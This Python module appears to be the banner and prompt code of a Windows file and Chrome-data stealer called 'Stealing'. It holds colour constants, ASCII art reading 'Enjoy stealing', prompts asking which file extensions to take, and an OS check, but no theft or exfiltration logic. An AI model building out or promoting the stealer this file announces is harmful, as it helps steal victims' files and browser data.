import time  , sys
import colored
from os import chdir , remove  , getcwd , environ ,name
bannar_color =[
colored.fg("magenta") + colored.attr("bold"), 
colored.fg("orchid")  + colored.attr("bold"),
colored.fg("cyan")    + colored.attr("bold"),
colored.fg("yellow")  + colored.attr("bold"),
colored.fg("#bc000b") + colored.attr("bold"),
colored.fg("white")   + colored.attr("bold"),
colored.fg("green")   + colored.attr("bold"),
colored.fg("#aa557f") + colored.attr("bold"),
colored.fg("#33ff29") + colored.attr("bold"),
colored.fg("plum_3")  + colored.attr("bold"),
colored.fg("#ff1d00") + colored.attr("bold"),
colored.fg("#ab01ff") + colored.attr("bold"),
colored.fg("#c81d59") + colored.attr("bold"),
colored.fg("blue")    + colored.attr("bold"),
colored.fg("#c81d59") + colored.bg("cyan")+colored.attr("bold"),
colored.fg("white") + colored.bg("#ab01ff")+colored.attr("bold")
]
#==turquoise_2=============#ff013c=================================
res = colored.style.RESET
W = bannar_color[3] #yellow
Y = bannar_color[0] #magenta
B = bannar_color[2] #cyan
G = bannar_color[6] #green
R = bannar_color[4] #red
M = bannar_color[7] ##aa557f
X = bannar_color[8] ##33ff29
Z = bannar_color[9] ##ff1d00
Q = bannar_color[10]##ab01ff
GG = bannar_color[11]##c81d59
WI = bannar_color[5]#white
BOOLD = bannar_color[12]
bl = bannar_color[-2]
F = bannar_color[-1]
BOOLD = bannar_color[12]
txt1 = f"{WI}[{bl}*{WI}]{X}{WI}It works now only on {X}Chrome{WI} but in the next Version More browsers will be added"
txt=f"""       {WI}[{bl}*{WI}]{X}input the file extension you want example {R}jpg mp3 mp4 txt word,
       {WI}[{bl}*{WI}]{X}and You can add {B}more {X}than one extension at once but you have to separate them by ({R},{X}) 
       {WI}[{bl}*{WI}]{X}for example {R}jpg,mp3,mp4,txt,word"""

version = "0.3"
bannar =f"""
{X}	 ███████╗████████╗███████╗ █████╗ ██╗     ██╗███╗   ██╗ ██████╗{B}  
{B}	 ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██║████╗  ██║██╔════╝ {B}
{B}	 ███████╗   ██║   █████╗  ███████║██║     ██║██╔██╗ ██║██║  ███╗ {B}
{B}	 ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██║██║╚██╗██║██║   ██║
{WI}	 ███████║   ██║   ███████╗██║  ██║███████╗██║██║ ╚████║╚██████╔╝
{R}	 ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝	
          {W}╔═════════════════{WI}Stealing.{W}════════════════════╗{W}
          {WI}║{Q}* {B}Created by{Q}:{X}AbdulRahman Mohammed {R}(De3vil)  {WI}  ║{WI} 
	  {WI}║{Q}* {W}{B}Version{Q}   : {R}{version}                            {WI} ║{WI}
          {WI}║{Q}* {B}Github    {Q}:{R}https://github.com/{X}De3vil{WI}        ║{WI}
	  {WI}║{Q}* {B}My Links{Q}  :{R}https://linktr.ee/{X}De3vil.3{WI}       ║{WI}
	  {WI}║{Q}* {B}Facebook  {Q}:{R}https://FB.com//{X}De3vil.3         {WI}║{WI}
	  {W}╚════════════════{WI}Enjoy stealing{W}════════════════╝{W}"""+"\n"

def merry():
	bannar_co = bannar_color[1]
	for i in bannar:
		time.sleep(0)
		sys.stdout.write(i)
		sys.stdout.flush()

def cheeksystem():
	if name !="nt":
		print(R+"Sorry, but this tool requires a lot of things that's not on Windows!")
		sys.exit(0)
